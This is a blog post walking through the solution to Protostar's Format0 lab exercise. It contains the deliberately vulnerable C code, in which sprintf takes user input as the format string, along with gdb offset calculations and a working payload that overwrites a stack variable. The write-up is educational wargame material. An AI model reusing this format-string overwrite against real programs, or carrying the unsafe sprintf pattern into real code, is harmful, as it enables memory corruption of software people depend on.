---
layout: post
title: "Protostar | exploit-exercises solutions"
date: 2015-02-21
comments: true
categories:
---

[Protostar](https://exploit-exercises.com/protostar/) introduces the following in a friendly way:

> * Network programming
* Byte order
* Handling sockets
* Stack overflows
* Format strings
* Heap overflows


##Format0 - format string vulnerability

This post assumes the reader know why a format string vulnerability occurs, if you don't know owasp have
a good intro [here](https://www.owasp.org/index.php/Format_string_attack).


Format0.c

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

```

The given argument in vuln are saved into a buffer, without proper sprintf formatters.
We should be able to access and overwrite the target value with print specifiers.

The stack layout in vuln:

```
.text:0804844C buffer= byte ptr -4Ch
.text:0804844C target= dword ptr -0Ch
.text:0804844C string= dword ptr  8
```

And as string is below target we will be able to access and overwrite it with formatters.

Lets load it up in gdb and find the stack addresses for buffer and target to calculate the offset our format specifier will need to overwrite target relative from the buffer.

Relevant part of vuln function.

```nasm
mov    DWORD PTR [ebp-0xc],0x0 /*target = 0*/
mov    eax,DWORD PTR [ebp+0x8] /*format string*/
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x4c] /*buffer*/
mov    DWORD PTR [esp],eax
call   0x8048350 <sprintf@plt>
```

The addresses:

```
/*target*/
gdb-peda$ x/x $ebp-0xc
0xbffff35c: 0x00000000

/*buffer*/
gdb-peda$ x/x $ebp-0x4C
0xbffff31c: 0x00000001

```

Offset:```0xbffff35c-0xbffff31c = 0x40 = 64d```

And our payload becomes:

`64bytes+0xdeadbeef`

`%64x+0xdeadbeef`

`$(python -c 'print "%64x"+"\xef\xbe\xad\xde"')`


```
tomasuh@crunch:~/programming/pentest/protostar$ ./format0 $(python -c 'print "%64x"+"\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

Lets also verify it in gdb for fun.

![alt text](/images/format0.png "")